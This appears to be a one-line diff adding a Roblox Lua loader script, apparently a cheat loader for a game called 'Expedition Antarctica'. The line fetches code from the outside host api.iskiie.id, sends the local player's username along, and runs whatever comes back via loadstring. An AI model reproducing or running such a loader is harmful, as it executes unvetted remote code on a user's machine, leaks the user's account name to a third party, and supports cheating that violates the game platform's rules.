@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://api.iskiie.id/roblox/expedition_antartica/index?username=" .. game.Players.LocalPlayer.Name))()
